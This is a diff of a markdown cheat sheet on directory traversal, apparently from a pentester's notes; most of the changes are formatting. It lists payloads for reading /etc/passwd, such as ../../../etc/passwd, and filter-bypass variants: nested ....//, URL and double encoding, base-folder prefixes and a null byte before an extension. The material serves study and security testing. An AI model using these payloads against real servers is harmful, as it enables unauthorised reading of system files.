@@ -3,20 +3,20 @@
 ## <mark style="color:yellow;">General info</mark>
 
 * `<img src="/loadImage?filename=218.png">`
-* An attacker can request the following URL to retrieve the /etc/passwd file from the server's filesystem
+* An attacker can request the following URL to retrieve the `/etc/passwd` file from the server's filesystem
 * `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
 * On Windows, both `../` and `..\` are valid directory traversal sequences
 
 ## <mark style="color:yellow;">Bypass defences</mark>
 
-* elimination (strip): `../` -> `....//`
+* Elimination (strip): `../` -> `....//`
   * Test: try to change the orginal request `GET /image?filename=1.jpg` to `GET /image?filename=../1.jpg`
   * If the file is loaded the code strip `../`
-* encode: `%2e%2e%2f`
-* double-encode: `%252e%252e%252f`
-* require to start with the expected base folder es. `/var/www/images` -> `filename=/var/www/images/../../../etc/passwd`
-* require to end with an expected file extension es. `.png` -> `filename=../../../etc/passwd%00.png`
-* others
+* Encode: `../` ->`%2e%2e%2f`
+* Double-encode: `../` ->`%252e%252e%252f`
+* Require to start with the expected base folder es. `/var/www/images` -> `filename=/var/www/images/../../../etc/passwd`
+* Require to end with an expected file extension es. `.png` -> `filename=../../../etc/passwd%00.png`
+* Others
 
 ## <mark style="color:yellow;">Tips</mark>
 
